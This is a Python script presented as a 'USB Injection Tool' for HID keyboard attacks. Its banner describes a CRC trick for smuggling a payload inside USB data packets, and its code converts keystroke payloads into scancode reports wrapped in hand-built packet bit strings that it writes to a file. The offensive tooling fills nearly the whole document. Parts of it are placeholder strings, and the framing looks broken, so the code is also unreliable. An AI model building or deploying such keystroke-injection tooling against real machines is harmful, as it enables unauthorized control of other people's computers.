working='''
########################################################################################################################
#                                                                                                                      #
#                                /\ \/\ \/\  _`\ /\  _`\    __                                                         #
#                                \ \ \ \ \ \,\_\_\ \ \_\ \ /\_\    ___     ____                                        #
#                                 \ \ \ \ \/_\__ \\\\ \  _ <'\/\ \  / __`\  /',__\                                       #
#                                  \ \ \_\ \/\ \_\ \ \ \_\ \\\\ \ \/\ \_\ \/\__, `\                                      #
#                                   \ \_____\ `\____\ \____/ \ \_\ \____/\/\____/                                      #
#                                    \/_____/\/_____/\/___/   \/_/\/___/  \/___/     V=0.1                             #
#                                                                                                                      #
#----------------------------------------------------------------------------------------------------------------------#
#                                              Usb Injection Tool                                                      #
#                                               by BlackThether                                                        #
#----------------------------------------------------------------------------------------------------------------------#
# In order to pass a payload we need to have this data sections                                                        #
# |data|=|crc16(0)|eop|payload|sync|pid|                                                                               #
# so that                                                                                                              #
# |datapacket|=|sync|pid|(|crc16(0)|eop|  payload   |sync|pid|)|crc16(something not 0)|eop|                            #
#                                                                                                                      #
# wath this do: |sync|pid|0|crc16(0)|eop|              payload              |sync|pid|0|crc16(something not 0)|eop|    #
#                         |                               |                                     |                      #
#                 (send an empty data)            (does something)            (fails couse of crc16 so is ignored)     #
#                    (does nothing)                                                                                    #
#                                                                                                                      #
# note that the only thing that does something is the payload                                                          #
#                                                                                                                      #
# in payload we can use 1023-crc16-eop-sync-pid=1023-16-3-8-8=988 bits of data, wich is not a lot, but enought for an  #
# hid attack (via file copying)                                                                                        #
#                                                                                                                      #
########################################################################################################################
                                              |  |  |  |  |  |  |  | 
                              ####################################################
                              #--------------------------------------------------#
                              #                    Syntax                        #
                              #--------------------------------------------------#
                              #              You have to write:                  #
                              #        [Attack Type Letter][Payload]             #
                              #                                                  #
                              #          ___Attack Type Letters___               #------------
                              #                                                  #----------- |
                              #           H: HID attack (Keyboard)               #          | |
                              ####################################################          | |
                                                                                           \   / 
                                                                                            \ /
'''
parasing='''
#####################################################
#       _____                    _                  #
#      |  __ \                  (_)                 #
#      | |__) |_ _ _ __ __ _ ___ _ _ __   __ _      #
#      |  ___/ _` | '__/ _` / __| | '_ \ / _` |     #
#      | |  | (_| | | | (_| \__ \ | | | | (_| |     #
#      |_|   \__,_|_|  \__,_|___/_|_| |_|\__, |     #
#                                         __/ |     #
#                                        |___/      #
#####################################################
'''
adding='''
#####################################################
#     /\      | |   | (_)                           #
#    /  \   __| | __| |_ _ __   __ _   _   _ _ __   #
#   / /\ \ / _` |/ _` | | '_ \ / _` | | | | | '_ \  #
#  / ____ \ (_| | (_| | | | | | (_| | | |_| | |_) | #
# /_/    \_\__,_|\__,_|_|_| |_|\__, |  \__,_| .__/  #
#                               __/ |       | |     #
#                              |___/        |_|     #
#          _____           _        _               #
#         |  __ \         | |      | |              #
#         | |__) |_ _  ___| | _____| |_ ___         #
#         |  ___/ _` |/ __| |/ / _ \ __/ __|        #
#         | |  | (_| | (__|   <  __/ |_\__ \        #
#         |_|   \__,_|\___|_|\_\___|\__|___/        #                     
#####################################################


'''
writing='''
#####################################################
#     __          __   _ _   _                      #
#     \ \        / /  (_) | (_)                     #
#      \ \  /\  / / __ _| |_ _ _ __   __ _          #
#       \ \/  \/ / '__| | __| | '_ \ / _` |         #
#        \  /\  /| |  | | |_| | | | | (_| |         #
#         \/  \/ |_|  |_|\__|_|_| |_|\__, |         #
#                                     __/ |         #
#                                     |___/         #
#####################################################
'''
done='''
'########:::'#######::'##::: ##:'########:
 ##.... ##:'##.... ##: ###:: ##: ##.....::
 ##:::: ##: ##:::: ##: ####: ##: ##:::::::
 ##:::: ##: ##:::: ##: ## ## ##: ######:::
 ##:::: ##: ##:::: ##: ##. ####: ##...::::
 ##:::: ##: ##:::: ##: ##:. ###: ##:::::::
 ########::. #######:: ##::. ##: ########:
........::::.......:::..::::..::........::
'''
AskFile='''
###########
####
#############Can you please give me the location to write the file? tankYou:'''

scancode={"KEY_MOD_LCTRL": "0x01","KEY_MOD_LSHIFT": "0x02","KEY_MOD_LALT": "0x04","KEY_MOD_LMETA": "0x08","KEY_MOD_RCTRL": "0x10","KEY_MOD_RSHIFT": "0x20","KEY_MOD_RALT": "0x40","KEY_MOD_RMETA": "0x80","KEY_NONE": "0x00","KEY_ERR_OVF": "0x01","KEY_A": "0x04","KEY_B": "0x05","KEY_C": "0x06","KEY_D": "0x07","KEY_E": "0x08","KEY_F": "0x09","KEY_G": "0x0a","KEY_H": "0x0b","KEY_I": "0x0c","KEY_J": "0x0d","KEY_K": "0x0e","KEY_L": "0x0f","KEY_M": "0x10","KEY_N": "0x11","KEY_O": "0x12","KEY_P": "0x13","KEY_Q": "0x14","KEY_R": "0x15","KEY_S": "0x16","KEY_T": "0x17","KEY_U": "0x18","KEY_V": "0x19","KEY_W": "0x1a","KEY_X": "0x1b","KEY_Y": "0x1c","KEY_Z": "0x1d","KEY_1": "0x1e","KEY_2": "0x1f","KEY_3": "0x20","KEY_4": "0x21","KEY_5": "0x22","KEY_6": "0x23","KEY_7": "0x24","KEY_8": "0x25","KEY_9": "0x26","KEY_0": "0x27","KEY_ENTER": "0x28","KEY_ESC": "0x29","KEY_BACKSPACE": "0x2a","KEY_TAB": "0x2b","KEY_ ": "0x2c","KEY_MINUS": "0x2d","KEY_EQUAL": "0x2e","KEY_LEFTBRACE": "0x2f","KEY_RIGHTBRACE": "0x30","KEY_BACKSLASH": "0x31","KEY_HASHTILDE": "0x32","KEY_SEMICOLON": "0x33","KEY_APOSTROPHE": "0x34","KEY_GRAVE": "0x35","KEY_COMMA": "0x36","KEY_DOT": "0x37","KEY_SLASH": "0x38","KEY_CAPSLOCK": "0x39","KEY_F1": "0x3a","KEY_F2": "0x3b","KEY_F3": "0x3c","KEY_F4": "0x3d","KEY_F5": "0x3e","KEY_F6": "0x3f","KEY_F7": "0x40","KEY_F8": "0x41","KEY_F9": "0x42","KEY_F10": "0x43","KEY_F11": "0x44","KEY_F12": "0x45","KEY_SYSRQ": "0x46","KEY_SCROLLLOCK": "0x47","KEY_PAUSE": "0x48","KEY_INSERT": "0x49","KEY_HOME": "0x4a","KEY_PAGEUP": "0x4b","KEY_DELETE": "0x4c","KEY_END": "0x4d","KEY_PAGEDOWN": "0x4e","KEY_RIGHT": "0x4f","KEY_LEFT": "0x50","KEY_DOWN": "0x51","KEY_UP": "0x52","KEY_NUMLOCK": "0x53","KEY_KPSLASH": "0x54","KEY_KPASTERISK": "0x55","KEY_KPMINUS": "0x56","KEY_KPPLUS": "0x57","KEY_KPENTER": "0x58","KEY_KP1": "0x59","KEY_KP2": "0x5a","KEY_KP3": "0x5b","KEY_KP4": "0x5c","KEY_KP5": "0x5d","KEY_KP6": "0x5e","KEY_KP7": "0x5f","KEY_KP8": "0x60","KEY_KP9": "0x61","KEY_KP0": "0x62","KEY_KPDOT": "0x63","KEY_102ND": "0x64","KEY_COMPOSE": "0x65","KEY_POWER": "0x66","KEY_KPEQUAL": "0x67","KEY_F13": "0x68","KEY_F14": "0x69","KEY_F15": "0x6a","KEY_F16": "0x6b","KEY_F17": "0x6c","KEY_F18": "0x6d","KEY_F19": "0x6e","KEY_F20": "0x6f","KEY_F21": "0x70","KEY_F22": "0x71","KEY_F23": "0x72","KEY_F24": "0x73","KEY_OPEN": "0x74","KEY_HELP": "0x75","KEY_PROPS": "0x76","KEY_FRONT": "0x77","KEY_STOP": "0x78","KEY_AGAIN": "0x79","KEY_UNDO": "0x7a","KEY_CUT": "0x7b","KEY_COPY": "0x7c","KEY_PASTE": "0x7d","KEY_FIND": "0x7e","KEY_MUTE": "0x7f","KEY_VOLUMEUP": "0x80","KEY_VOLUMEDOWN": "0x81","KEY_KPCOMMA": "0x85","KEY_RO": "0x87","KEY_KATAKANAHIRAGANA": "0x88","KEY_YEN": "0x89","KEY_HENKAN": "0x8a","KEY_MUHENKAN": "0x8b","KEY_KPJPCOMMA": "0x8c","KEY_HANGEUL": "0x90","KEY_HANJA": "0x91","KEY_KATAKANA": "0x92","KEY_HIRAGANA": "0x93","KEY_ZENKAKUHANKAKU": "0x94","KEY_KPLEFTPAREN": "0xb6","KEY_KPRIGHTPAREN": "0xb7","KEY_LEFTCTRL": "0xe0","KEY_LEFTSHIFT": "0xe1","KEY_LEFTALT": "0xe2","KEY_LEFTWINDOWS": "0xe3","KEY_RIGHTCTRL": "0xe4","KEY_RIGHTSHIFT": "0xe5","KEY_RIGHTALT": "0xe6","KEY_RIGHTMETA": "0xe7","KEY_MEDIA_PLAYPAUSE": "0xe8","KEY_MEDIA_STOPCD": "0xe9","KEY_MEDIA_PREVIOUSSONG": "0xea","KEY_MEDIA_NEXTSONG": "0xeb","KEY_MEDIA_EJECTCD": "0xec","KEY_MEDIA_VOLUMEUP": "0xed","KEY_MEDIA_VOLUMEDOWN": "0xee","KEY_MEDIA_MUTE": "0xef","KEY_MEDIA_WWW": "0xf0","KEY_MEDIA_BACK": "0xf1","KEY_MEDIA_FORWARD": "0xf2","KEY_MEDIA_STOP": "0xf3","KEY_MEDIA_FIND": "0xf4","KEY_MEDIA_SCROLLUP": "0xf5","KEY_MEDIA_SCROLLDOWN": "0xf6","KEY_MEDIA_EDIT": "0xf7","KEY_MEDIA_SLEEP": "0xf8","KEY_MEDIA_COFFEE": "0xf9","KEY_MEDIA_REFRESH": "0xfa","KEY_MEDIA_CALC": "0xfb","KEY_MOD_":"0x00"}


def modpas(mode,let):
    if mode=='H':
        u=[]
        for i in let:
            n=i.split('+')
            l=n.pop(0)
            if l.isupper():
                n.append('LSHIFT')
            n.extend(['',''])
            l=scancode['KEY_'+l.upper()]
            opa=scancode['KEY_MOD_'+n[0].upper()]
            opb=scancode['KEY_MOD_'+n[1].upper()]
            u.append(opa+' '+opb+' '+l+' 0x00 0x00 0x00 0x00 ')
        return u
    return let

print(working)

def parase(payload): 
    print(parasing)
    mode=payload[0]
    payload=payload[1:]
    startdata,enddata,beg,en=modifiers[mode]
    a=[]
    a.extend(startdata)
    a.extend([beg+i+en for i in modpas(mode,payload.split(','))])
    a.extend(enddata)
    print(adding)
    return a

modifiers={'H':[['friststartcall','secondstartcall'],['fristendcall','end'],'beg','end']}




crc0='0000000000000000'
eop='001'
sync='01010100'
pid='11010010'

begin=crc0+eop
end=sync+pid

# Simple to understand but not fast way
#
#
#file=''
#for i in parase(input('Payload: ')):
#    file+=begin+i+end
#
# The same but more pythonic



fil=begin+(end+begin).join(parase(open(input('                                                                                  **Payload location:** '),'r').read().split('\n')[0]))+end

#print(fil)
print(writing)
with open(input(AskFile),'w') as f:
    f.write(fil)
print(done)
